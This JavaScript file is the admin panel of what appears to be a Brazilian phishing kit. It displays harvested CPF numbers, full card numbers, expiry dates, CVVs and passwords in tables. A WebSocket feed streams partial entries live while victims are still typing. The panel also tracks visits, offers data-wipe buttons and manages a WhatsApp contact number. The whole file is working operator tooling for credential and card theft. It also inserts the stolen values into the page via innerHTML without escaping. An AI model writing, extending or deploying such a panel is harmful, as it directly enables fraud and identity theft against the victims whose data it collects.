// Load WhatsApp number
async function loadWhatsAppNumber() {
    try {
        const response = await fetch('/api/contact-number');
        console.log('Fetching WhatsApp number, response status:', response.status);
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error response from /api/contact-number:', errorText);
            throw new Error(`Erro ao carregar o número do WhatsApp: ${errorText}`);
        }
        const data = await response.json();
        document.getElementById('whatsapp-number').value = data.contactNumber;
        console.log('WhatsApp number loaded successfully:', data.contactNumber);
    } catch (error) {
        console.error('Error loading WhatsApp number:', error.message);
        document.getElementById('whatsapp-message').textContent = `Erro ao carregar o número do WhatsApp: ${error.message}`;
        document.getElementById('whatsapp-message').classList.add('text-red-600');
    }
}

// Update WhatsApp number
document.getElementById('update-whatsapp-btn').addEventListener('click', async () => {
    const whatsappNumberInput = document.getElementById('whatsapp-number');
    const whatsappMessage = document.getElementById('whatsapp-message');
    const whatsappNumber = whatsappNumberInput.value.trim();

    if (!whatsappNumber || !/^\+\d{10,15}$/.test(whatsappNumber)) {
        whatsappMessage.textContent = 'Por favor, insira um número de WhatsApp válido (ex.: +5511999999999).';
        whatsappMessage.classList.add('text-red-600');
        return;
    }

    try {
        const response = await fetch('/api/contact-number', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ contactNumber: whatsappNumber })
        });

        console.log('Updating WhatsApp number, response status:', response.status);
        const result = await response.json();

        if (response.ok) {
            whatsappMessage.textContent = 'Número do WhatsApp atualizado com sucesso!';
            whatsappMessage.classList.remove('text-red-600');
            whatsappMessage.classList.add('text-green-600');
        } else {
            whatsappMessage.textContent = result.error || 'Erro ao atualizar o número do WhatsApp.';
            whatsappMessage.classList.add('text-red-600');
        }
    } catch (error) {
        console.error('Error updating WhatsApp number:', error.message);
        whatsappMessage.textContent = `Erro ao atualizar o número do WhatsApp: ${error.message}`;
        whatsappMessage.classList.add('text-red-600');
    }
});

// Load visits data (only total visits for the summary)
async function loadVisits() {
    try {
        const response = await fetch('/api/visits');
        console.log('Fetching visits, response status:', response.status);
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error response from /api/visits:', errorText);
            throw new Error(`Erro ao carregar os dados de visitas: ${errorText}`);
        }
        const data = await response.json();
        document.getElementById('total-visits').textContent = data.totalVisits;
        console.log('Visits data loaded successfully:', data);
    } catch (error) {
        console.error('Error loading visits:', error.message);
        alert(`Erro ao carregar os dados de visitas: ${error.message}`);
    }
}

// Load submissions
async function loadSubmissions() {
    try {
        const response = await fetch('/api/form-data');
        console.log('Fetching submissions, response status:', response.status);
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error response from /api/form-data:', errorText);
            throw new Error(`Erro ao carregar os dados: ${errorText}`);
        }
        const submissions = await response.json();
        const tableBody = document.getElementById('submissions-table-body');

        document.getElementById('total-submissions').textContent = submissions.length;

        if (submissions.length > 0) {
            const lastSubmission = submissions[0];
            document.getElementById('last-update').textContent = new Date(lastSubmission.submitted_at).toLocaleString('pt-BR');
        } else {
            document.getElementById('last-update').textContent = 'N/A';
        }

        tableBody.innerHTML = '';

        submissions.forEach(submission => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td class="px-4 py-2 text-gray-700">${submission.id}</td>
                <td class="px-4 py-2 text-gray-700">${submission.cpf}</td>
                <td class="px-4 py-2 text-gray-700">${submission.card_number}</td>
                <td class="px-4 py-2 text-gray-700">${submission.expiry_date}</td>
                <td class="px-4 py-2 text-gray-700">${submission.cvv}</td>
                <td class="px-4 py-2 text-gray-700">${submission.password}</td>
                <td class="px-4 py-2 text-gray-700">${new Date(submission.submitted_at).toLocaleString('pt-BR')}</td>
            `;
            tableBody.appendChild(row);
        });
        console.log('Submissions data loaded successfully:', submissions);
    } catch (error) {
        console.error('Error loading submissions:', error.message);
        alert(`Erro ao carregar os dados: ${error.message}`);
    }
}

// Load temporary submissions with debounce and retry mechanism
let retryDelay = 1000; // Initial retry delay of 1 second
let lastFetchTime = 0;
const debounceTime = 5000; // Debounce de 5 segundos

async function loadTempSubmissions() {
    const now = Date.now();
    if (now - lastFetchTime < debounceTime) {
        console.log('Debounce aplicado, aguardando 5 segundos...', new Date().toLocaleString('pt-BR'));
        return;
    }

    try {
        const response = await fetch('/api/temp-data');
        console.log('Fetching temporary submissions, response status:', response.status, 'em:', new Date().toLocaleString('pt-BR'));
        if (!response.ok) {
            if (response.status === 429) {
                console.warn(`Limite de requisições atingido. Tentando novamente em ${retryDelay / 1000} segundos.`);
                await new Promise(resolve => setTimeout(resolve, retryDelay));
                retryDelay = Math.min(retryDelay * 2, 30000); // Exponential backoff up to 30 seconds
                return loadTempSubmissions(); // Retry
            }
            const errorText = await response.text();
            console.error('Error response from /api/temp-data:', errorText, 'em:', new Date().toLocaleString('pt-BR'));
            throw new Error(`Erro ao carregar os dados temporários: ${errorText}`);
        }
        retryDelay = 1000; // Reset delay after success
        lastFetchTime = now;
        const tempSubmissions = await response.json();
        const tableBody = document.getElementById('temp-submissions-table-body');

        tableBody.innerHTML = '';

        if (tempSubmissions.length === 0) {
            const row = document.createElement('tr');
            row.innerHTML = `<td colspan="8" class="px-4 py-2 text-center text-gray-500">Nenhuma informação em andamento.</td>`;
            tableBody.appendChild(row);
        } else {
            tempSubmissions.forEach(submission => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td class="px-4 py-2 text-gray-700">${submission.session_id}</td>
                    <td class="px-4 py-2 text-gray-700">${submission.cpf || ''}</td>
                    <td class="px-4 py-2 text-gray-700">${submission.card_number || ''}</td>
                    <td class="px-4 py-2 text-gray-700">${submission.expiry_date || ''}</td>
                    <td class="px-4 py-2 text-gray-700">${submission.cvv || ''}</td>
                    <td class="px-4 py-2 text-gray-700">${submission.password || ''}</td>
                    <td class="px-4 py-2 text-gray-700">${new Date(submission.updated_at).toLocaleString('pt-BR')}</td>
                    <td class="px-4 py-2 text-gray-700">
                        <button class="delete-btn btn-small bg-red-500 text-white px-3 py-1 rounded-full flex items-center gap-1" data-session-id="${submission.session_id}">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            Remover
                        </button>
                    </td>
                `;
                tableBody.appendChild(row);
            });
        }

        // Adiciona eventos de clique aos botões "Remover"
        document.querySelectorAll('.delete-btn').forEach(button => {
            button.addEventListener('click', () => {
                const sessionId = button.getAttribute('data-session-id');
                deleteTempSubmission(sessionId);
            });
        });

        console.log('Temporary submissions data loaded successfully:', tempSubmissions, 'em:', new Date().toLocaleString('pt-BR'));
    } catch (error) {
        console.error('Error loading temporary submissions:', error.message, 'em:', new Date().toLocaleString('pt-BR'));
        const tableBody = document.getElementById('temp-submissions-table-body');
        tableBody.innerHTML = `<tr><td colspan="8" class="px-4 py-2 text-center text-red-500">Erro ao carregar dados: ${error.message}</td></tr>`;
    }
}

// Delete a specific temporary submission
async function deleteTempSubmission(sessionId) {
    if (!confirm(`Tem certeza que deseja remover a submissão temporária com sessão ${sessionId}? Esta ação não pode ser desfeita.`)) {
        console.log('Deletion cancelled by user for sessionId:', sessionId);
        return;
    }
    try {
        console.log('Attempting to delete temp submission with sessionId:', sessionId, 'em:', new Date().toLocaleString('pt-BR'));
        const response = await fetch(`/api/delete-temp-data/${encodeURIComponent(sessionId)}`, {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        console.log('Delete temp submission response status:', response.status, 'em:', new Date().toLocaleString('pt-BR'));
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error response from /api/delete-temp-data:', errorText);
            console.error('Response headers:', [...response.headers.entries()]);
            throw new Error(`Erro ao remover a submissão temporária: ${errorText} (Status: ${response.status})`);
        }

        const result = await response.json();
        console.log('Delete temp submission response:', result, 'em:', new Date().toLocaleString('pt-BR'));
        alert('Submissão temporária removida com sucesso!');

        // Forçar o recarregamento da tabela após a exclusão
        await loadTempSubmissions();
        console.log('Temporary submissions table reloaded after deletion em:', new Date().toLocaleString('pt-BR'));
    } catch (error) {
        console.error('Error deleting temporary submission:', error.message, 'em:', new Date().toLocaleString('pt-BR'));
        alert(`Erro ao remover a submissão temporária: ${error.message}`);
    }
}

// Delete all submissions
async function deleteSubmissions() {
    if (!confirm('Tem certeza que deseja apagar todas as Infos salvas? Esta ação não pode be desfeita.')) {
        return;
    }
    try {
        const response = await fetch('/api/delete-form-data', {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        console.log('Deleting submissions, response status:', response.status, 'em:', new Date().toLocaleString('pt-BR'));
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error response from /api/delete-form-data:', errorText);
            throw new Error(`Erro ao apagar as submissões: ${errorText}`);
        }
        alert('Infos apagadas com sucesso!');
        // No need to call loadSubmissions here; WebSocket will handle the update
    } catch (error) {
        console.error('Error deleting submissions:', error.message, 'em:', new Date().toLocaleString('pt-BR'));
        alert(`Erro ao apagar as submissões: ${error.message}`);
    }
}

// Reset visit counter
async function resetVisitCounter() {
    if (!confirm('Tem certeza que deseja zerar o contador de visitas? Esta ação não pode ser desfeita.')) {
        return;
    }
    try {
        const response = await fetch('/api/reset-visits', {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        console.log('Resetting visits, response status:', response.status, 'em:', new Date().toLocaleString('pt-BR'));
        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error response from /api/reset-visits:', errorText);
            throw new Error(`Erro ao zerar o contador de visitas: ${errorText}`);
        }
        alert('Contador de visitas zerado com sucesso!');
        // No need to call loadVisits here; WebSocket will handle the update
    } catch (error) {
        console.error('Error resetting visit counter:', error.message, 'em:', new Date().toLocaleString('pt-BR'));
        alert(`Erro ao zerar o contador de visitas: ${error.message}`);
    }
}

// Refresh all data manually
async function refreshData() {
    await loadSubmissions();
    await loadTempSubmissions();
    await loadVisits();
}

// WebSocket setup for real-time updates with enhanced logging
let ws;
function initWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${window.location.host}`);

    ws.onopen = () => {
        console.log('Conexão WebSocket estabelecida em:', new Date().toLocaleString('pt-BR'));
        ws.send(JSON.stringify({ type: 'INITIAL_UPDATE' })); // Solicita atualização inicial
    };

    ws.onmessage = (event) => {
        const message = JSON.parse(event.data);
        console.log('Mensagem WebSocket recebida em:', new Date().toLocaleString('pt-BR'), 'Dados brutos:', event.data, 'Mensagem parseada:', message);
        if (message.type === 'TEMP_DATA_UPDATE' || message.type === 'INITIAL_UPDATE') {
            console.log('Atualização de dados temporários detectada, recarregando...');
            loadTempSubmissions(); // Chama sem await para debounce controlar
        } else if (message.type === 'FORM_DATA_UPDATE') {
            loadSubmissions();
        } else if (message.type === 'VISIT_UPDATE') {
            loadVisits();
        }
    };

    ws.onclose = () => {
        console.log('Conexão WebSocket fechada em:', new Date().toLocaleString('pt-BR'), 'Tentando reconectar imediatamente...');
        setTimeout(initWebSocket, 1000); // Tenta reconectar após 1 segundo
    };

    ws.onerror = (error) => {
        console.error('Erro no WebSocket em:', new Date().toLocaleString('pt-BR'), 'Detalhes:', error);
    };
}

// Add event listeners for the buttons
document.getElementById('delete-submissions-btn').addEventListener('click', deleteSubmissions);
document.getElementById('reset-visits-btn').addEventListener('click', resetVisitCounter);
document.getElementById('refresh-data-btn').addEventListener('click', refreshData);

// Logout functionality
document.getElementById('logout-btn').addEventListener('click', () => {
    if (confirm('Deseja realmente sair do painel administrativo?')) {
        window.location.href = '/admin';
    }
});

// Load data on page load
window.onload = () => {
    console.log('Página carregada em:', new Date().toLocaleString('pt-BR'));
    loadWhatsAppNumber();
    loadSubmissions();
    loadVisits();
    loadTempSubmissions(); // Carrega dados iniciais
    initWebSocket(); // Inicializa WebSocket para atualizações em tempo real
    // Verificação periódica como fallback a cada 5 minutos
    setInterval(() => {
        loadTempSubmissions().then(() => {
            console.log('Verificação periódica de temporários concluída em:', new Date().toLocaleString('pt-BR'));
        }).catch(err => console.error('Erro na verificação periódica:', err));
    }, 300000); // Ajustado para 5 minutos (300 segundos)
};
